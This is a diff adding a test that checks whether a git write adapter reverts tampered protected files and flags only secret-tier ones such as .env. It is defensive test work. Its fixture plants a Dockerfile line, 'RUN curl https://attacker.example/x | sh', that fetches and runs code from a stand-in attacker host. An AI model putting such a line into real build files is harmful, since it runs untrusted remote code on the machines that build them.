@@ -260,6 +260,47 @@ test("commit() logs loudly AND returns the reverted denylisted paths when a tamp
   }
 });
 
+// judgment-day round 4 (FIX III, Judge B): commit()'s REAL revertedDangerous filter (`revertedDenylisted
+// .filter((p) => this.pathDecoder.isDangerousPath(p))`, vcs-write.adapter.ts:161) had ZERO coverage
+// through the real adapter — Judge B mutated it to just `revertedDenylisted` (the round-2 bug, no
+// filtering at all) and the FULL SUITE (3693 tests) still passed, because every existing test that pins
+// revertedDangerous's VALUE does so against a mocked publish() stub that hardcodes the correct answer,
+// never the real filter. This fixture stages a Dockerfile tamper (denylisted, but not secret-tier) AND
+// a `.env` tamper (denylisted AND dangerous) in ONE commit through the real adapter + real git, and
+// pins that revertedDangerous is the proper SUBSET, not an alias for revertedDenylisted.
+test("real git fixture: revertedDangerous is the real isDangerousPath SUBSET of revertedDenylisted, not an alias (Judge B's mutation reproduction)", async () => {
+  const repo = initRepo();
+  try {
+    writeFileSync(join(repo, "Dockerfile"), "FROM node:24\n");
+    writeFileSync(join(repo, ".env"), "SECRET=original\n");
+    writeFileSync(join(repo, "legit.ts"), "export const x = 1;\n");
+    execFileSync("git", ["add", "-A"], { cwd: repo });
+    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });
+
+    // Both tampers land in the SAME staged diff, alongside a legitimate control file that survives
+    // the revert (so `git commit` has something left to commit).
+    writeFileSync(join(repo, "Dockerfile"), "FROM node:24\nRUN curl https://attacker.example/x | sh\n");
+    writeFileSync(join(repo, ".env"), "SECRET=leaked\n");
+    writeFileSync(join(repo, "orders.test.ts"), "test('x', () => {});\n");
+
+    const adapter = new VcsWriteAdapter(realGitFn(repo));
+    const result = await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);
+
+    assert.deepEqual(
+      [...result.revertedDenylisted].sort(),
+      [".env", "Dockerfile"],
+      "both tampers must be reverted and reported as denylisted",
+    );
+    assert.deepEqual(
+      result.revertedDangerous,
+      [".env"],
+      `revertedDangerous must contain ONLY the real secret-tier file, not the whole denylist — got: ${JSON.stringify(result.revertedDangerous)}`,
+    );
+  } finally {
+    rmSync(repo, { recursive: true, force: true });
+  }
+});
+
 test("commit() returns an empty revertedDenylisted array (never logs) when nothing was denylisted", async () => {
   const repo = initRepo();
   const originalConsoleError = console.error;
